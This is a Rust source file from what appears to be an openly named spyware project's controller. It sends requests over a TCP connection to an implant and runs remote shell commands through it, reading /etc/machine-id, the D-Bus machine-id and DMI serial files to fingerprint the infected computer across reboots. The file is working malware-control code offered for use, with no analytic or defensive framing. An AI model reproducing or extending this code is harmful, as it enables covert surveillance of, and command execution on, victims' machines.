use spyware::communication::messages::{
    ErrorInfo, GetBasicInfoRequest, GetBasicInfoResponse, Message, OperatingSystem,
};
use spyware::communication::server::get_message;
use spyware_cli::commands::{run_command, send_request};
use std::net::TcpStream;

#[derive(Debug, Fail)]
pub enum SpywareControlError {
    #[fail(
        display = "Could not get a computer identifier for the spyware, on OS {:?}",
        os
    )]
    FailToGetComputerIdentifier { os: OperatingSystem },
    #[fail(display = "Could not get basic info for the spyware")]
    GetBasicSpywareInfoError { error_info: ErrorInfo },
}

pub fn get_basic_spyware_info(
    mut stream: &mut TcpStream,
) -> Result<GetBasicInfoResponse, SpywareControlError> {
    let request = GetBasicInfoRequest {
        placeholder: "".to_string(),
    };
    send_request(Message::GetBasicInfoRequest { 0: request }, stream)
        .expect("Could not send get basic info request");
    let response = get_message(&mut stream).expect("Could not get message from stream");
    match response {
        Message::GetBasicInfoResponse(gbir) => {
            if gbir.error_info.is_none() {
                Ok(gbir)
            } else {
                Err(SpywareControlError::GetBasicSpywareInfoError {
                    error_info: gbir.error_info.unwrap(),
                })
            }
        }
        _ => {
            panic!("Bad");
        }
    }
}

pub fn get_unique_computer_identifier(
    stream: &mut TcpStream,
) -> Result<String, SpywareControlError> {
    // TODO implement for windows and freeBSD with get basic info
    // Ways to get unique identifiers across reboots
    // On freeBSD:
    // sysctl kern.hostuuid
    // On Windows:
    let commands_to_get_id_linux = [
        "cat /etc/machine-id",
        "cat /var/lib/dbus/machine-id",
        "cat /sys/class/dmi/id/product_uuid",
        "cat /sys/class/dmi/id/board_serial",
    ];
    for command in commands_to_get_id_linux.iter() {
        match run_command(command.to_string(), stream) {
            Ok(res) => return Ok(res.output),
            Err(err) => {
                println!(
                    "Could not get unique identifier running {}, got error {:?}",
                    command, err
                );
            }
        }
    }
    Err(SpywareControlError::FailToGetComputerIdentifier {
        os: OperatingSystem::Linux,
    })
}
